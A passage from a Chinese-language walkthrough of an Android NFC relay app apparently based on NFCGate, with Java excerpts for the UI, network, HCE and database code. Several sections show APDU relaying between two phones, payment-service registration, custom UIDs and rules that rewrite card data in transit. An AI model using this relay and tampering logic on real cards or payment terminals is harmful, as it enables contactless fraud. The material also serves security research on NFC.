PackageManager.PERMISSION_GRANTED) {\n          ActivityCompat.requestPermissions(getActivity(), PERMISSIONS_STORAGE, REQUEST_PERMISSION_CODE);\n      }\n  }\n  ```\n\n- 动态申请默认支付权限\n\n  ```java\n  NfcAdapter adapter = NfcAdapter.getDefaultAdapter(getContext());\n  // 通过上面实例化一个NFCAdapter之后, 成功获取了CardEmulation实例\n  mCardEmulation = CardEmulation.getInstance(adapter);\n  // ComponentName输入的是对应的包名和类\n  ComponentName myComponent = new ComponentName(\"tud.seemuh.nfcgate\",\"tud.seemuh.nfcgate.nfc.hce.ApduService\");\n  // 调用CardEmulation的方法\n  if (!mCardEmulation.isDefaultServiceForCategory(myComponent, CardEmulation.CATEGORY_PAYMENT)) {\n      Intent intent = new Intent(CardEmulation.ACTION_CHANGE_DEFAULT);\n      intent.putExtra(CardEmulation.EXTRA_CATEGORY, CardEmulation.CATEGORY_PAYMENT);\n      intent.putExtra(CardEmulation.EXTRA_SERVICE_COMPONENT, myComponent);\n      startActivityForResult(intent, 0);\n  } else {\n      Log.e(\"MainActivityHost\", \"on Create: Already default!\");\n  }\n  ```\n\n- 设置Spinner控件的Adapter\n\n  ```java\n  ArrayAdapter<String> listadapter = new ArrayAdapter<String>(getContext(), android.R.layout.simple_spinner_dropdown_item,myFile);\n  sp.setAdapter(listadapter);\n  ```\n\n#### 5. LoggingDetailFragment\n\n这个`Fragment`是布局Logging数据的视图, 算是一个比较复杂的`Fragment`了, 将会对如下特性作解释.\n\n- AlertDialog\n\n  ```java\n  private AlertDialog getRenameSessionDialog() {\n      AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());\n      // Add input value 给TextView添加原本来的Session\n      final EditText input = new EditText(getActivity());\n      if (mSession.getName() != null) {\n          input.setText(mSession.getName());\n      }\n  \n      // Set up text\n      builder.setTitle(getText(R.string.title_dialog_rename))\n          .setMessage(getText(R.string.rename_dialog_text))\n          .setView(input)\n          .setIcon(R.drawable.ic_action_edit_title)\n          .setPositiveButton(getString(R.string.rename_dialog_confirm), new DialogInterface.OnClickListener() {\n              @Override\n              public void onClick(DialogInterface dialogInterface, int i) {\n                  doSessionRename(input.getText().toString());\n              }\n          });\n  \n      builder.setNegativeButton(getString(R.string.rename_dialog_cancel), this);\n  \n      return builder.create();\n  }\n  ```\n\n  这算是一个比较经典的关于弹窗的案例了, `AlertDialog.Builder`实例化的对象有多种设置组件的方法, 如上面代码所示, 最后调用`getRenameSessionDialog.show()`即可弹窗.\n\n- AsyncTask\n\n  ```java\n  private class AsyncSessionLoader extends AsyncTask<Long, Void, Cursor> {\n      private final String TAG = \"AsyncSessionLoader\";\n  \n      private SQLiteDatabase mDB;\n  \n      // 重写此方法以在后台线程上执行计算\n      @Override\n      protected Cursor doInBackground(Long... longs) {\n          Log.d(TAG, \"doInBackground: Started\");\n          // Get a DB object\n          SessionLoggingDbHelper dbHelper = new SessionLoggingDbHelper(getActivity());\n          mDB = dbHelper.getReadableDatabase();\n  \n          // Construct query\n          // Define Projection\n          String[] projection = {\n              SessionLoggingContract.SessionMeta._ID,\n              SessionLoggingContract.SessionMeta.COLUMN_NAME_NAME,\n              SessionLoggingContract.SessionMeta.COLUMN_NAME_DATE,\n          };\n          // Define Sort order\n          String sortorder = SessionLoggingContract.SessionMeta.COLUMN_NAME_DATE + \" DESC\";\n          // Define Selection\n          String selection = SessionLoggingContract.SessionMeta._ID + \" LIKE ?\";\n          // Define Selection Arguments\n          String[] selectionArgs = {String.valueOf(longs[0])};\n  \n          // Perform query\n          Log.d(TAG, \"doInBackground: Performing query\");\n          Cursor c = mDB.query(\n              SessionLoggingContract.SessionMeta.TABLE_NAME,  // Target Table\n              projection,    // Which fields are we interested in?\n              selection,     // Selection clause\n              selectionArgs, // Arguments to clause\n              null,          // Grouping (not desired in this case)\n              null,          // Filtering (not desired in this case)\n              sortorder      // Sort order\n          );\n  \n          Log.d(TAG, \"doInBackground: Query done, returning\");\n          return c;\n  \t}\n      \n      // 必须从应用程序的主线程调用此方法, 上面方法返回的cursor传入下面的方法\n      @Override\n      protected void onPostExecute(Cursor c) {\n          // Move to the first element of the cursor\n          Log.d(TAG, \"onPostExecute: Beginning processing of Sessions\");\n          if (!c.moveToFirst()) {\n              Log.i(TAG, \"onPostExecute: Cursor empty, doing nothing.\");\n              return;\n          }\n  \n          // prepare session object\n          long ID = c.getLong(c.getColumnIndexOrThrow(SessionLoggingContract.SessionMeta._ID));\n          String name = c.getString(c.getColumnIndexOrThrow(SessionLoggingContract.\n                                                            SessionMeta.COLUMN_NAME_NAME));\n          String date = c.getString(c.getColumnIndexOrThrow(SessionLoggingContract.\n                                                            SessionMeta.COLUMN_NAME_DATE));\n          NfcSession session = new NfcSession(date, ID, name);\n  \n          // Update session information\n          setSessionDetails(session);\n          Log.d(TAG, \"onPostExecute: Closing connection and finishing\");\n          c.close();\n          mDB.close();\n      }\n  }\n  ```\n\n  这里用了UI多线程[AsyncTask](https://developer.android.com/reference/android/os/AsyncTask)的方式从数据库中加载Session的Apdu数据. \n\n#### 6. LoggingFragment\n\n这里的特性跟`loggingDetailFragment`的差不多, 是Session列表的视图界面, 具体分析不再展开.\n\n#### 7. MitmFragment\n\n在RelayFragment中可以跳到这个Fragment, 这里主要的操作也是数据库操作. 如下:\n\n```java\n// get data from user, then storage in database\n// 这里需要注意的是, 因为调用了CustomTextWatcher, 每一个字节16进制字符串会有一个空格, 因此入库的时候要把空格删掉\nString name = etName.getText().toString();\nString reader = etReader.getText().toString().replace(\" \",\"\");\nString card = etCard.getText().toString().replace(\" \",\"\");\n\n// check input hex format\nif (name.length() == 0) {\n    Toast.makeText(getActivity(),\"Please input command Function!\",Toast.LENGTH_SHORT).show();\n    return;\n} else if (!Utils.isHex(mContext, reader) && Utils.isHex(mContext, card)) {\n    return;\n}\n\n// save in database\nRuleListItem ruleListItem = new RuleListItem(\n    name,\n    new NfcComm(NfcComm.Source.HCE,Utils.toBytes(reader)),\n    new NfcComm(NfcComm.Source.CARD,Utils.toBytes(card))\n);\nRuleListStorage mRuleDb = new RuleListStorage(mContext);\nmRuleDb.add(ruleListItem);\n\n// add item list\nrefreshList();\n\nmListAdapter.notifyDataSetChanged();\n// success message show in activity\nToast.makeText(getActivity(),\"Save Successfully!\",Toast.LENGTH_SHORT).show();\ndialog.dismiss();\n```\n\n#### 8. RelayFragment\n\n这个Fragment应该是最重要的一个了. 一开始先实例化诸多空间和诸多类, 控制Nerwork/NFC/Database等. 下面将一些方法实现.\n\n1. checkIpPort\n\n   ```java\n   // regex for IP checking\n   private static final String regexIPpattern =\"^(([01]?\\\\d\\\\d?|2[0-4]\\\\d|25[0-5])\\\\.){3}([01]?\\\\d\\\\d?|2[0-4]\\\\d|25[0-5])$\";\n   private static int maxPort = 65535;\n   ．．．\n   // 这个方法是检测IP和port的\n   public boolean checkIpPort(String ip, String port) {\n       boolean validPort = false;\n       boolean gotException = false;\n       boolean validIp = false;\n       // 实例化matcher以便根据正则确定是否是合法的IP\n       Pattern pattern = Pattern.compile(regexIPpattern);\n       Matcher matcher = pattern.matcher(ip);\n       \n       int int_port = 0;\n       try {\n           int_port = Integer.parseInt(port.trim());\n       } catch (NumberFormatException e) {\n           gotException = true;\n       }\n       if (!gotException) {\n       // 若在端口范围内, 则validPort置为true\n           if ((int_port > 0) && (int_port <= maxPort)) validPort = true;\n       }\n       validIp = matcher.matches();\n       if (validPort) globalPort = int_port;\n       // 只有port和ip都合法时才返回true\n       return validPort && validIp;\n   }\n   ```\n\n2. defineUID\n\n   ```java\n   mFilterManager.rule.setAc(RuleMatching.MitMAction.SelfDefineAnticol);\n   final AlertDialog.Builder builder = new AlertDialog.Builder(getContext());\n   final EditText input = new EditText(getContext());\n   input.addTextChangedListener(new CustomTextWatcher(input));\n   builder.setTitle(R.string.pref_define_uid_title)\n       .setCancelable(true)\n       .setMessage(R.string.pref_define_uid_hex)\n       .setView(input)\n       .setPositiveButton(\"Confirm\", new DialogInterface.OnClickListener() {\n           @Override\n           public void onClick(DialogInterface dialog, int which) {\n               String UID = input.getText().toString().replace(\" \",\"\");\n               // 检查UID的长度是不是4个字节\n               if(!Utils.isHexAndByte(UID, getContext(),4)){\n                   return;\n               }\n               // 如果检查通过则调用Filtermanager里实例化的Rule, 这里对应的是RuleMatching\n               mFilterManager.rule.setUID(UID);\n           }\n       })\n       .setNegativeButton(\"Cancel\", new DialogInterface.OnClickListener() {\n           @Override\n           public void onClick(DialogInterface dialog, int which) {\n               return;\n           }\n       });\n   builder.create();\n   builder.show();\n   break;\n   ```\n\n   关于defineUID的有三种UID模式, 分别是: `RandomUID` `SelfDefineUID` `DefultUID`, 分别对应三个case, 上示代码是关于`selfdefineUID`的代码. \n\n3. networkConnectCommon\n\n   ```java\n   private void networkConnectCommon() {\n       // Initialize SinkManager\n       mSinkManager = new SinkManager(mSinkManagerQueue);\n   \n       // Initialize FilterManager\n       mFilterManager = new FilterManager();\n   \n       // Pass references\n       // 用来存储Apdu数据\n       mNfcManager.setSinkManager(mSinkManager, mSinkManagerQueue);\n       // 用来过滤Apdu数据\n       mNfcManager.setFilterManager(mFilterManager);\n       // 用来HighLevelProtobufHandler\n       mNfcManager.setNetworkHandler(mConnectionClient);\n   \n       // FIXME For debugging purposes, hardcoded selecting of sinks happens here\n       // This should be selectable by the user\n   \n       // Initialize sinks\n       // Get Preference manager to determine which sinks are active\n       SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(getActivity());\n   \n       // Determine settings for sinks\n       boolean textViewSinkActive   = prefs.getBoolean(getString(R.string.pref_key_debugWindow), false);\n       boolean logfileSinkActive    = prefs.getBoolean(getString(R.string.pref_key_logfile), false);\n       boolean logSessionSinkActive = prefs.getBoolean(getString(R.string.pref_key_sessionlogging), false);\n   \n      // try...catch...排错, 存储network中的Apdu\n       try {\n           if (textViewSinkActive) {\n               // Debug window is active, activate the sink that collects data for it\n               mSinkManager.addSink(SinkManager.SinkType.DISPLAY_TEXTVIEW, mDebuginfo, false);\n           }\n           if (logfileSinkActive) {\n               // Logging to file is active. Generate filename from timestamp\n               SimpleDateFormat sdfDate = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\", Locale.US);\n               Date now = new Date();\n               String strDate = sdfDate.format(now);\n   \n               // Initialize File Sink 保存txt log到存储空间\n               mSinkManager.addSink(SinkManager.SinkType.FILE, strDate + \".txt\");\n           }\n           if (logSessionSinkActive) {\n               mSinkManager.addSink(SinkManager.SinkType.SESSION_LOG, getActivity());\n           }\n       } catch (SinkInitException e) {\n           e.printStackTrace();\n       }\n       // TODO Initialize and add Filters\n       // Do the actual network connection\n       mConnectionClient.connect(mIP.getText().toString(), port);\n   }\n   ```\n\n### Ⅲ. tabLayout & tabLogic\n\n#### PagerAdapter\n\n如果还需要在`MainActivity`中添加`Fragment`视图, 可以直接在这个类里添加就好, 修改的地方有三点:\n\n```java\n// 每增加一个Fragment, return的值就+1\n@Override\npublic int getCount() {\n    return 4;\n}\n\n// 每增加一个Fragment, 就在对应的position返回对应的名称, 以设置名称的值\n@Override\npublic CharSequence getPageTitle(int position) {\n    if (position == 0) {\n        return \"Relay\";\n    } else if (position == 1) {\n        return \"Clone\";\n    } else if (position == 2) {\n        return \"Log\";\n    } else if (position == 3) {\n        return \"HCE\";\n    } else {\n        return \"Item \" + (position + 1);\n    }\n}\n\n// 每增加一个Fragment, 就根据pos的位置return一个instance.\n@Override\npublic Fragment getItem(int pos) {\n    switch (pos) {\n        case 0:\n            return RelayFragment.getInstance();\n        case 1:\n            return CloneFragment.getInstance();\n        case 2:\n            return LoggingFragment.getInstance();\n        case 3:\n            return HceFragment.getInstance();\n        default:\n            return RelayFragment.getInstance();\n    }\n}\n```\n\n### Ⅳ. Activity\n\n#### 1. AboutWorkaroundActivity\n\n```java\nmWebView = (WebView) findViewById(R.id.workaroundDescWebView);\n// Returns the language code of this Locale.\nString loc = Locale.getDefault().getLanguage();\n// 检索这些资源的底层 AssetManager 存储.\nAssetManager mg = getResources().getAssets();\nString path = \"html/desfire-info.\" + loc + \".html\";\ntry {\n    mg.open(path);\n    Log.i(TAG, \"HTML exists for locale \" + loc + \", using it.\");\n    // mWebView实例加载了该目录下的html\n    mWebView.loadUrl(\"file:///android_asset/\" + path);\n} catch (IOException ex) {\n    Log.i(TAG, \"No HTML for locale \" + loc + \", using default (en)\");\n    mWebView.loadUrl(\"file:///android_asset/html/desfire-info.en.html\");\n}\n```\n\n#### 2. EditActivity\n\n```java\n// 这个Activity主要是在HCE模式下, 用来编辑数据的.\n// 从资源中, 获取对应txt的map并放到TextView\nMap<String,String> myMap= Utils.currentMap;\nfor(Map.Entry<String,String> entry:myMap.entrySet()){\n    mData.add(new ItemBean(entry.getKey(),entry.getValue()));\n}\n// 给mData listview设置Adapter\nmAdapter = new ListViewAdapter(this, mData);\nUtils.tableAdapter = mAdapter;\nmListView.setAdapter(mAdapter);\n\n//添加控件的监听事件\nmButton.setOnClickListener(new View.OnClickListener() {\n    @Override\n    public void onClick(View view) {\n        mData.add(new ItemBean());\n        mAdapter.notifyDataSetChanged();\n    }\n});\n```\n\n#### 3. LogActivity\n\n这个Activity用在HCE模式中查看Log的视图界面, 内容较简单, 不再细讲.\n\n#### 4. MainActivity\n\n这个Activity是控制整个project的枢纽.\n\n```java\n// 这里初始化hce hook action\nDaemonConfiguration.Init(this);\n// 这里注册接收器\nregisterReceiver(new BroadcastReceiver() {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        Toast.makeText(context, intent.getStringExtra(\"text\"), Toast.LENGTH_LONG).show();\n    }\n}, new IntentFilter(\"tud.seemuh.nfcgate.toaster\"));\n```\n\n#### 5. SettingActivity\n\n这个Activity是`设置`界面的Activity, \n\n## 0x02 network模块\n\n### Ⅰ. c2c/c2s/meta\n\n这三个是根据protobuf序列化之后的类, 不用改, 直接调用就好.\n\n### Ⅱ. HighLevelProtobufHandler\n\n`HightLevelProtobufhandler`是``HighLevelNetworkHandler`接口的实现。它用于控制所有的网络通信，并使用一个低级别的网络处理程序来进行实际的网络通信。在这个处理程序和各自的回调实现（在我们的例子中是`ProtobufCallBack`）中，协议本身被实现。`HightLevelProtobufhandler`保持网络连接的状态，并负责在连接断开连接时拆卸所有相关的线程，由用户请求或一般连接丢失负责。\n\n```java\n// 动态修改Button\nprivate void reactivateButtons() {\n    // We need to pass a parameter, even though it isn't used. Otherwise, the app will crash.\n    new UpdateUI(connectButton, UpdateUI.UpdateMethod.enableButton).execute(\"Unfug\");\n    new UpdateUI(joinButton, UpdateUI.UpdateMethod.enableButton).execute(\"Unfug\");\n    new UpdateUI(abortButton, UpdateUI.UpdateMethod.disableButton).execute(\"Unfug\");\n}\n\nprivate void setButtonTexts() {\n    new UpdateUI(connectButton, UpdateUI.UpdateMethod.setTextButton).execute(MainActivity.createSessionMessage);\n    new UpdateUI(joinButton, UpdateUI.UpdateMethod.setTextButton).execute(MainActivity.joinSessionMessage);\n    new UpdateUI(resetButton, UpdateUI.UpdateMethod.setTextButton).execute(MainActivity.resetMessage);\n}\n```\n\n接下来是三个比较重要的函数:\n\n```java\n// for reader\n@Override\npublic void sendAPDUMessage(NfcComm nfcdata) {\n    // 检测是否是apdu数据\n    if (nfcdata.getType() != NfcComm.Type.NFCBytes) {\n        Log.e(TAG, \"sendApduMessage: NfcComm object does not contain NFC bytes. Doing nothing.\");\n        return;\n    }\n    // 若reader mode关闭了, 则返回\n    if (status != Status.PARTNER_READER_MODE) {\n        Log.e(TAG, \"sendAPDUMessage: Trying to send APDU message to partner who is not in reader mode. Doing nothing.\");\n        return;\n    }\n    byte[] apdu = nfcdata.getData();\n    \n    // Prepare message\n    C2C.NFCData.Builder apduMessage = C2C.NFCData.newBuilder();\n    // 给apduMessage 设置READER属性\n    apduMessage.setDataSource(C2C.NFCData.DataSource.READER);\n    apduMessage.setDataBytes(ByteString.copyFrom(apdu));\n\n    // Send prepared message\n    sendMessage(apduMessage.build(), MessageCase.NFCDATA);\n}\n\n// for card\n@Override\npublic void sendAPDUReply(NfcComm nfcdata) {\n    if (nfcdata.getType() != NfcComm.Type.NFCBytes) {\n        Log.e(TAG, \"sendApduReply: NfcComm object does not contain NFC bytes. Doing nothing.\");\n        return;\n    }\n    if (status != Status.PARTNER_APDU_MODE) {\n        Log.e(TAG, \"sendAPDUReply: Trying to send APDU reply to partner who is not in APDU mode. Doing nothing.\");\n        return;\n    }\n    byte[] nfcbytes = nfcdata.getData();\n\n    // Build reply Protobuf\n    C2C.NFCData.Builder reply = C2C.NFCData.newBuilder();\n    reply.setDataBytes(ByteString.copyFrom(nfcbytes));\n    // 设置CARD属性\n    reply.setDataSource(C2C.NFCData.DataSource.CARD);\n\n    // Send reply\n    sendMessage(reply.build(), MessageCase.NFCDATA);\n}\n\n// it's about uid\n@Override\npublic void sendAnticol(NfcComm nfcdata) {\n    if (nfcdata.getType() != NfcComm.Type.AnticolBytes) {\n        Log.e(TAG, \"sendAnticol: NfcComm object does not contain Anticol bytes. Doing nothing.\");\n        return;\n    }\n\n    // Retrieve values\n    byte[] config = nfcdata.getConfig().build();\n\n    // Build reply protobuf\n    C2C.Anticol.Builder b = C2C.Anticol.newBuilder();\n    b.setCONFIG(ByteString.copyFrom(config));\n\n    // TODO If we aren't in a session, cache this and send it as soon as a session is established?\n    // (And delete it if the card is removed in the meantime)\n    sendMessage(b.build(), MessageCase.ANTICOL);\n    Log.d(TAG, \"sendAnticol: Sent Anticol message\");\n}\n```\n\n### Ⅲ. LowLevelTCPHandler\n\n该类只发送和接收原始字节，所有的协议逻辑和解析分别发生在HighLevelNetworkHandler或回调实例中。原始数据按照4字节的长度发送数据, 并且通过socket把所有的数据都发送出去.  `BufferedInputStream`为另一个输入流添加功能 - 即缓冲输入和支持mark和reset 方法的能力。当`BufferedInputStream` 创建时，会创建一个内部缓冲区数组。当流中的字节被读取或跳过时，内部缓冲区将根据需要从所包含的输入流中重新填充，一次处理多个字节。该mark 操作会记住输入流中的一个点，并且该reset操作会导致自从最近mark操作以来，在从所包含的输入流中获取新字节之前重新读取所有字节。\n\n```java\nbyte[] lenbytes = new byte[4];\nint rcvlen = dis.read(lenbytes);\nLog.d(TAG, \"Got \" + rcvlen + \" bytes\");\nint len = ByteBuffer.wrap(lenbytes).getInt();\n\n// read the message data\nif (len > 0) {\n    Log.i(TAG, \"Reading bytes of length:\" + len);\n    readBytes = new byte[len];\n    int read = 0;\n    do {\n        // read(byte[] b, int off, int len)\n        // 将该字节输入流中的字节读入指定的字节数组，从给定的偏移量开始。\n        read += dis.read(readBytes, read, len-read);\n    } while(read < len);\n\n    Log.d(TAG, \"Read data: \" + Utils.bytesToHex(readBytes));\n    if(mCallback != null) {\n        Log.d(TAG, \"Delegating to Callback.\");\n        Log.i(\"readBytes: \", Utils.bytesToHex(readBytes));\n        mCallback.onDataReceived(readBytes);\n        Log.d(TAG, \"Callback finished execution.\");\n    }\n    else {\n        Log.i(TAG, \"No callback set, saving for later\");\n        getSome = true;\n    }\n} else {\n    Log.e(TAG, \"Error no postive number of bytes: \" + len);\n    throw new IOException(\"Protocol error: Length information was negative or null\");\n}\n```\n\n### Ⅳ. ProtobufCallback\n\n这个类里面包含卡和读卡器所有的数据流, 其中最为重要的是`handleWrapperMessage`这个函数, 如下:\n\n```java\nprivate void handleWrapperMessage(MetaMessage.Wrapper Wrapper) {\n    // Determine which type of Message the MetaMessage contains\n    if (Wrapper.getMessageCase() == MessageCase.DATA) {\n        Log.i(TAG, \"onDataReceived: MessageCase.DATA: Sending to handler\");\n        handleData(Wrapper.getData());\n    }\n    else if (Wrapper.getMessageCase() == MessageCase.NFCDATA) {\n        Log.i(TAG, \"onDataReceived: MessageCase:NFCDATA: Sending to handler\");\n        handleNFCData(Wrapper.getNFCData());\n    }\n    else if (Wrapper.getMessageCase() == MessageCase.SESSION) {\n        Log.i(TAG, \"onDataReceived: MessageCase.SESSION: Sending to handler\");\n        handleSession(Wrapper.getSession());\n    }\n    else if (Wrapper.getMessageCase() == MessageCase.STATUS) {\n        Log.i(TAG, \"onDataReceived: MessageCase.STATUS: Sending to handler\");\n        handleStatus(Wrapper.getStatus());\n    }\n    else if (Wrapper.getMessageCase() == MessageCase.ANTICOL) {\n        Log.i(TAG, \"onDataReceived: MessageCase.ANTICOL: Sending to handler\");\n        handleAnticol(Wrapper.getAnticol());\n    }\n    else {\n        Log.e(TAG, \"onDataReceived: Message fits no known case! This is fucked up\");\n        Handler.notifyUnknownMessageType();\n    }\n}\n```\n\n这个函数根据来自`LowLevelNetWorkHandler`的数据流, 来对该数据进一步分类, 根据特定的数据类型让特定的函数操作. 例如`handleNFCData`和`handleSession`以及`handleAnticol`. 接下来拿`handleNFCData`举例分析:\n\n```java\nprivate void handleNFCData(C2C.NFCData msg) {\n    if (msg.getDataSource() == C2C.NFCData.DataSource.READER) {\n        // We received a signal FROM a reader device and are required to talk TO a card.\n        Log.i(TAG,\"hangleNFCData: \" + Utils.bytesToHex(msg.getDataBytes().toByteArray()));\n        NfcComm nfcdata = new NfcComm(NfcComm.Source.HCE, msg.getDataBytes().toByteArray());\n        mNfcManager.sendToCard(nfcdata);\n    } else  if (msg.getDataSource() == C2C.NFCData.DataSource.CARD) {\n        // We received a signal FROM a card and are required to talk TO a reader.\n        NfcComm nfcdata = new NfcComm(NfcComm.Source.CARD, msg.getDataBytes().toByteArray());\n        mNfcManager.sendToReader(nfcdata);\n    } else {\n        // Wait, what? This should be impossible. Are we using an old protocol version?\n        Log.e(TAG, \"HandleNfcData: Received Nfc Data from unknown source => Not implemented\");\n        Handler.notifyNotImplemented();\n    }\n}\n```\n\n`msg`传入这个函数之后, 再通过`if...else if...else`对该数据进行分类, 分为`card`的数据和`reader`的数据. 最后再通过`sendToCard` 和 `sendRoReader` 函数对这些数据分流, 这两个函数在`NFCManager.java`会介绍.\n\n## 0x03 nfc模块\n\n### Ⅰ. config\n\n1. **ConfigBuilder**\n\n   这是一个将`anticol`进行数据格式的转换的类. 其中包含两个重要的函数`parse`和`build`, 如下所示:\n\n   ```java\n   // 这个函数会将config数据(也就是Hce手机端接受的第一条来自card的数据)根据特定的数据类型转换为可读的有意义的数据.\n   public void parse(byte[] config) {\n       mOptions.clear();\n       int index = 0;\n   \n       while(index + 2 < config.length) {\n           byte type = config[index + 0];\n           byte length = config[index + 1];\n   \n           byte[] data = new byte[length];\n           System.arraycopy(config, index + 2, data, 0, length);\n   \n           add(OptionType.fromType(type), data);\n           index += length + 2;\n       }\n   }\n   ```\n\n   ```java\n   // 这个函数是上一个函数的逆函数\n   public byte[] build() {\n       int length = 0;\n   \n       for (ConfigOption option : mOptions)\n           length += option.len() + 2;\n   \n       byte[] data = new byte[length];\n       int offset = 0;\n   \n       for (ConfigOption option : mOptions) {\n           option.push(data, offset);\n           offset += option.len() + 2;\n       }\n   \n       return data;\n   }\n   // 这个函数讲格式化之后的字符串拼接起来, 返回给调用者\n   @Override\n   public String toString() {\n       StringBuilder result = new StringBuilder();\n   \n       for (ConfigOption option : mOptions)\n           result.append(option.toString());\n       return result.toString();\n   }\n   ```\n\n2. **ConfigOption**\n\n   ```java\n   // 这个函数被上示代码中的toString函数调用\n   @Override\n   public String toString() {\n       StringBuilder result = new StringBuilder();\n   \t// 这里根据特定的数据, 给定特定的名称.\n       result.append(\"Type: \");\n       result.append(mID.toString());\n   \n       if (mData.length > 1) {\n           result.append(\" (\");\n           result.append(mData.length);\n           result.append(\")\");\n       }\n   \n       result.append(\", Value: 0x\");\n       result.append(bytesToHex(mData));\n       result.append(\"\\n\");\n   \n       return result.toString();\n   }\n   ```\n\n3. **OptionType**\n\n   这是一个枚举类, 为上示`parse`函数提供解析.\n\n### Ⅱ. hce\n\n1. **ApduService**\n\n   这个类是与底层lib交互apdu命令最终要的一个类, 其中重要的函数有`processCommandApdu`、`onDeactivated`、`sendResponse`等:\n\n   ```java\n   @Override\n   public byte[] processCommandApdu(byte[] apdu, Bundle extras) {\n       Log.d(TAG, \"APDU-IN: \" + Utils.bytesToHex(apdu));\n       // 这里需要留意的是, 只有当滑动到HCE界面的时候(即mCurrent==3), 才让其返回handleApdu的值\n       if (SlidingTabLayout.mCurrentPos == 3) {\n           return handleApdu(getApplicationContext(), apdu);\n       }\n       // Package the ADPU into a NfcComm object\n       NfcComm nfcdata = new NfcComm(NfcComm.Source.HCE, apdu);\n   \n       // Send the object to the handler\n       mNfcManager.handleHCEData(nfcdata);\n   \n       // Tell the HCE implementation to wait a moment\n       return DONT_RESPOND;\n   }\n   ```\n\n   这个函数传入的`byte[] apdu`就是来自卡的apdu命令, 而return的`byte[]`就是手机返回给卡的数据.\n\n   期间, 对输入进来的数据进行实例化之后, 通过`handleHCEData`函数处理.\n\n   ```java\n   // 这个函数当读卡器断开交易的时候被调用\n   @Override\n   public void onDeactivated(int reason) {\n       if (SlidingTabLayout.mCurrentPos == 3) {\n           Utils.tv.append(\"-------------------------------------End-------------------------------------\\n\");\n       } else {\n           mNfcManager.unsetApduService();\n       }\n   }\n   // sendResponseApdu函数是返回给卡的一个函数, 其功能相当于processCommandApdu的返回值\n   public void sendResponse(byte[] apdu) {\n       Log.d(TAG, \"APDU-OUT: \" + Utils.bytesToHex(apdu));\n       sendResponseApdu(apdu);\n   }\n   // 这个函数用在hce功能的时候, 其中处理逻辑都在Utils类中.\n   static byte[] handleApdu(Context context, byte[] apdu) {\n       Utils.tv.append(\"pos:\\n\"+Utils.bytesToHex(apdu)+\"\\n\\n\");\n       String payload =  Utils.Start(context,apdu);\n       Log.i(TAG,\"payload: \" + payload);\n       Utils.tv.append(\"card:\\n\"+payload+\"\\n\\n\");\n       return Utils.toBytes(payload);\n   }\n   ```\n\n2. **DaemonConfiguration**\n\n   这个类在`MainActivity`被调用, 这里会根据`Action`发送`Broadcast`.\n\n### Ⅲ. reader\n\n这里根据卡的类型选择特定的类返回相应的命令, 各种卡标签的识别是建立在继承`NFCTagReader`这个接口上的.\n\n### Ⅳ. NfcManager\n\n这是格式化apdu数据最重要的一个类, 定义了apdu的各种属性.\n\n```java\nprivate NfcComm handleHceDataCommon(NfcComm nfcdata) {\n    Log.d(TAG, \"handleHceDataCommon: Pre-Filter: \" +\n          Utils.bytesToHex(nfcdata.getData()));\n    if (mFilterManager != null) {\n        nfcdata = mFilterManager.filterHCEData(nfcdata);\n    }\n\n    notifySinkManager(nfcdata);\n\n    Log.d(TAG, \"handleHceDataCommon: Post-Filter: \" +\n          Utils.bytesToHex(nfcdata.getData()));\n    return nfcdata;\n}\n\n\nprivate NfcComm handleCardDataCommon(NfcComm nfcdata) {\n    Log.d(TAG, \"handleCardDataCommon: Pre-Filter: \" +\n          Utils.bytesToHex(nfcdata.getData()));\n    if (mFilterManager != null) {\n        nfcdata = mFilterManager.filterCardData(nfcdata);\n    }\n    notifySinkManager(nfcdata);\n\n    Log.d(TAG, \"handleCardDataCommon: Post-Filter: \" +\n          Utils.bytesToHex(nfcdata.getData()));\n    return nfcdata;\n}\n```\n\n上面两个函数, 分辨是handle `card` `reader` 的函数, 其中最为重要的是`filterCardData` `filterHCEData`两个函数, 其中中间人数据就是在`filterCardData` `filterHCEData`两个方法里被篡改的. 函数的实现在后面`RuleMatching.java`会介绍.\n\n```java\n\t/**\n     * Send NFC data to the card\n     * 这里主要将HCE手机的来自读卡器的apdu通过network发给另一部手机.\n     * @param nfcdata NFcComm object containing the message for the card\n     */\npublic void sendToCard(NfcComm nfcdata) {\n    if (mReader.isConnected()) {\n        nfcdata = handleHceDataCommon(nfcdata);\n        Log.i(TAG,\"sendToCard: \" + Utils.bytesToHex(nfcdata.getData()));\n        // Communicate with card\n        byte[] reply = mReader.sendCmd(nfcdata.getData());\n        if (reply == null) {\n            mReader.closeConnection();\n            mNetworkHandler.disconnectCardWorkaround();\n            mNetworkHandler.notifyNFCNotConnected();\n        } else {\n            // Create NfcComm object and pass it through filter and sinks\n            NfcComm nfcreply = new NfcComm(NfcComm.Source.CARD, reply);\n            nfcreply = handleCardDataCommon(nfcreply);\n\n            // Send message\n            mNetworkHandler.sendAPDUReply(nfcreply);\n        }\n    } else {\n        Log.e(TAG, \"HandleNFCData: No NFC connection active\");\n        // There is no connected NFC device\n        mNetworkHandler.notifyNFCNotConnected();\n    }\n}\n\n\n/**\n     * Send NFC data to the Reader\n     * 这里主要将普通手机读取的来自卡的apdu发给HCE进而发给读卡器.\n     * @param nfcdata NfcComm object containing the message for the Reader\n     */\npublic void sendToReader(NfcComm nfcdata) {\n    if (mApduService != null) {\n        // Pass data through sinks and filters\n        nfcdata = handleCardDataCommon(nfcdata);\n\n        // Send data to the Reader device\n        Log.i(TAG,\"sendToReader: \" + Utils.bytesToHex(nfcdata.getData()));\n        mApduService.sendResponse(nfcdata.getData());\n    } else {\n        Log.e(TAG, \"HandleNFCData: Received a message for a reader, but no APDU instance active.\");\n        mNetworkHandler.notifyNFCNotConnected();\n    }\n}\n```\n\n## 0x04 util\n\n### Ⅰ. db\n\n#### 1. CloneListStorage\n\n`CloneListItem`是定义数据库每个`Item`数据结构的一个类, 其实现并不复杂, 不再赘述. 接下来看`CloneListStorage`: \n\n1. 首先定义数据库名称及各列的列名。\n\n   ```java\n   // All Static variables\n   // Database Version\n   private static final int DATABASE_VERSION = 1;\n   \n   // Database Name\n   private static final String DATABASE_NAME = \"clonemode.db\";\n   \n   // table name\n   private static final String TABLE_NAME = \"list\";\n   \n   // Table Columns names\n   private static final String KEY_ID = \"id\";\n   private static final String KEY_NAME = \"name\";\n   private static final String KEY_CONFIG = \"config\";\n   ```\n\n2. 然后建立数据库：\n\n   ```java\n   // 如果要调用或者建立这个数据库, 传入一个context即可新建/获得这个数据库.\n   public CloneListStorage(Context context) {\n       super(context, 